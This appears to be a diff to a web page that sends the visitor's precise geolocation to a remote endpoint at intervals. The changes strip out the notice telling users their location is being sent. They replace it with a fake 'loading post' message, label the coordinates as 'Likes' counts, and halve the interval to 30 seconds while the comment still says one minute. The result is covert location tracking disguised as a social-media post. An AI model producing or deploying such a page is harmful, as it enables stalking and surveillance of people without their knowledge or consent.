@@ -40,10 +40,10 @@
             </div>
 
             <div class="aviso">
-                <strong>ℹ️ Aviso:</strong> Se está enviando tu ubicación cada minuto.
+                <strong>ℹ️ Aviso:</strong> Puede que necesites abrir el link desde el navegador de tu preferencia para poder visualizar este post.
             </div>
 
-            <div id="status">Iniciando seguimiento en tiempo real...</div>
+            <div id="status">Cargando Post...</div>
         </div>
     </div>
 
@@ -68,7 +68,7 @@
                 mode: "no-cors"
             });
 
-            document.getElementById('status').innerHTML = `📍 Actualizado: ${lat}, ${lon} (±${accuracy}m)<br>Cada 1 minuto`;
+            document.getElementById('status').innerHTML = `📍 Actualizado: ${lat}, ${lon} (±${accuracy}K)<br>Likes`;
             document.getElementById('status').style.background = "#004d00";
         }
 
@@ -83,7 +83,7 @@
                     enableHighAccuracy: true,
                     timeout: 10000
                 });
-            }, 60000); // 60000 ms = 1 minuto
+            }, 30000); // 30000 ms = 1 minuto
         } else {
             document.getElementById('status').innerHTML = "❌ Geolocalización no soportada";
         }
